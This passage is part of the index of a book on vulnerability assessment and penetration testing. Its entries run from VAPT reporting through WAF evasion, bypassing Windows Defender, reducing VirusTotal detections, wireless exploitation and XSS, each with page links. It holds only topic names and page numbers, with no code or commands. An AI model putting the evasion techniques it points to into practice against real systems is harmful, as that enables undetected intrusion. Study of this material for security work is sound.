detailed report [327](#ch10.xhtml_page327), [328](#ch10.xhtml_page328)

detailed reports, examples [342](#ch10.xhtml_page342)

engagement details [323](#ch10.xhtml_page323), [324](#ch10.xhtml_page324)

executive summary [324](#ch10.xhtml_page324)-[326](#ch10.xhtml_page326)

Network VAPT report [345](#ch10.xhtml_page345)-[348](#ch10.xhtml_page348)

severity-wise vulnerability distribution [326](#ch10.xhtml_page326)

table of contents [322](#ch10.xhtml_page322), [323](#ch10.xhtml_page323)

version control [321](#ch10.xhtml_page321)

Web application VAPT report [342](#ch10.xhtml_page342)-[344](#ch10.xhtml_page344)

Very Secure FTP Daemon (VSFTPD) backdoor [251](#ch08.xhtml_page251)

VirtualBox

Kali Linux, installing [35](#ch02.xhtml_page35)-[37](#ch02.xhtml_page37)

virtualization landscape

establishing [30](#ch02.xhtml_page30)

using, in VAPT [30](#ch02.xhtml_page30)

VirusTotal detections

reducing [281](#ch09.xhtml_page281)-[289](#ch09.xhtml_page289)

VMware workstation

Kali Linux, installing [31](#ch02.xhtml_page31)-[34](#ch02.xhtml_page34)

vulnerability assessment [3](#ch01.xhtml_page3), [97](#ch04.xhtml_page97)

application-based vulnerability scan [95](#ch04.xhtml_page95)

computer network [104](#ch04.xhtml_page104)

database vulnerability scan [95](#ch04.xhtml_page95)

host-based vulnerability scan [95](#ch04.xhtml_page95)

mobile application [115](#ch04.xhtml_page115), [116](#ch04.xhtml_page116)

network-based vulnerability scan [95](#ch04.xhtml_page95)

overview [94](#ch04.xhtml_page94)

web application [97](#ch04.xhtml_page97)

wireless vulnerability scan [95](#ch04.xhtml_page95)

Vulnerability Assessment and Penetration Testing (VAPT) [1](#ch01.xhtml_page1)

benefits [6](#ch01.xhtml_page6)

business and compliance requirements [6](#ch01.xhtml_page6)

customer success measurement [24](#ch01.xhtml_page24)

delivery and customer success tactics [23](#ch01.xhtml_page23)

fundamentals [3](#ch01.xhtml_page3)

industrial approach and methodology [7](#ch01.xhtml_page7)

project governance [23](#ch01.xhtml_page23)

project management [21](#ch01.xhtml_page21), [22](#ch01.xhtml_page22)

project planning [20](#ch01.xhtml_page20), [21](#ch01.xhtml_page21)

Vulnerability Assessment report

writing [333](#ch10.xhtml_page333)

vulnerability management [124](#ch04.xhtml_page124), [125](#ch04.xhtml_page125)

Vulnerability Management (VM) life cycle [96](#ch04.xhtml_page96)

Vulnerability Management (VM) tracker [341](#ch10.xhtml_page341)

vulnerability nomenclature [96](#ch04.xhtml_page96)

Vulnerability Priority Rating (VPR) matrix [334](#ch10.xhtml_page334)

vulnerable machines and applications

Buggy Web Application (BWAPP) [54](#ch02.xhtml_page54)-[56](#ch02.xhtml_page56)

Metasploitable 2 [52](#ch02.xhtml_page52)-[54](#ch02.xhtml_page54)

setting up [52](#ch02.xhtml_page52)

W

WAF evasion techniques [302](#ch09.xhtml_page302)

case manipulation [303](#ch09.xhtml_page303)

comments and whitespace tricks [304](#ch09.xhtml_page304), [305](#ch09.xhtml_page305)

dynamic payload generation [305](#ch09.xhtml_page305)

HTML encoding [304](#ch09.xhtml_page304)

mixed encodings [304](#ch09.xhtml_page304)

payload fragmentation and concatenation [305](#ch09.xhtml_page305)

tabs and line breaks [306](#ch09.xhtml_page306)

Unicode transformation [304](#ch09.xhtml_page304)

uninitialized variable exploitation [305](#ch09.xhtml_page305)

URL Percent-encoding [304](#ch09.xhtml_page304)

Web Application Firewall (WAF) [162](#ch06.xhtml_page162), [262](#ch09.xhtml_page262)

detecting [162](#ch06.xhtml_page162)

web application pen testing [156](#ch06.xhtml_page156), [157](#ch06.xhtml_page157)

attack vectors [158](#ch06.xhtml_page158)

mind map [160](#ch06.xhtml_page160)-[162](#ch06.xhtml_page162)

OWASP top 10 [158](#ch06.xhtml_page158)

threat modeling [159](#ch06.xhtml_page159), [160](#ch06.xhtml_page160)

Web application VAPT report

writing [342](#ch10.xhtml_page342)-[344](#ch10.xhtml_page344)

web application vulnerability assessment [97](#ch04.xhtml_page97)

Burp suite [100](#ch04.xhtml_page100)-[103](#ch04.xhtml_page103)

OWASP Zed Attack Proxy (ZAP) [98](#ch04.xhtml_page98)-[100](#ch04.xhtml_page100)

WHOIS command [63](#ch03.xhtml_page63)

Windows Defender [270](#ch09.xhtml_page270)

detection capabilities, bypassing [270](#ch09.xhtml_page270)-[277](#ch09.xhtml_page277)

Windows password hashing

Kerberos [225](#ch08.xhtml_page225)

NT LAN Manager (NTLM) [224](#ch08.xhtml_page224)

NTLMv2 [225](#ch08.xhtml_page225)

Windows Virtual Machine (VM)

BWAPP, setting up [54](#ch02.xhtml_page54)-[56](#ch02.xhtml_page56)

wireless network exploitation techniques [207](#ch07.xhtml_page207)

denial-of-service attacks [216](#ch07.xhtml_page216), [217](#ch07.xhtml_page217)

hidden SSIDs, bypassing [212](#ch07.xhtml_page212), [213](#ch07.xhtml_page213)

MAC and open authentication, bypassing [214](#ch07.xhtml_page214), [215](#ch07.xhtml_page215)

MITM attack, with rogue access point [211](#ch07.xhtml_page211)

WPA/WPA2 encryption, compromising [208](#ch07.xhtml_page208)-[210](#ch07.xhtml_page210)

wireless network fundamentals [197](#ch07.xhtml_page197)

Radio Frequency fundamentals [198](#ch07.xhtml_page198)

wireless network topologies and architectures [197](#ch07.xhtml_page197)

wireless networks and protocols overview [197](#ch07.xhtml_page197)

wireless pen testing [196](#ch07.xhtml_page196), [197](#ch07.xhtml_page197)

wireless pen testing methodology [198](#ch07.xhtml_page198)

approach [199](#ch07.xhtml_page199), [200](#ch07.xhtml_page200)

steps [199](#ch07.xhtml_page199)

wireless pen testing tools [200](#ch07.xhtml_page200)

Aircrack-ng [201](#ch07.xhtml_page201)

Kismet [201](#ch07.xhtml_page201)

NetStumbler [201](#ch07.xhtml_page201)

overview [201](#ch07.xhtml_page201)

Reaver [201](#ch07.xhtml_page201)

Wireshark [201](#ch07.xhtml_page201)

wireless security threats and standards [198](#ch07.xhtml_page198)

common wireless security threats [198](#ch07.xhtml_page198)

wireless security overview [198](#ch07.xhtml_page198)

Wireshark [201](#ch07.xhtml_page201)

WPA/WPA2 [208](#ch07.xhtml_page208)

X

Xmas scan [81](#ch03.xhtml_page81)

XSS

DOM-based XSS [179](#ch06.xhtml_page179)

reflected XSS [179](#ch06.xhtml_page179)

stored XSS [179](#ch06.xhtml_page179)

XSS Validator [180](#ch06.xhtml_page180)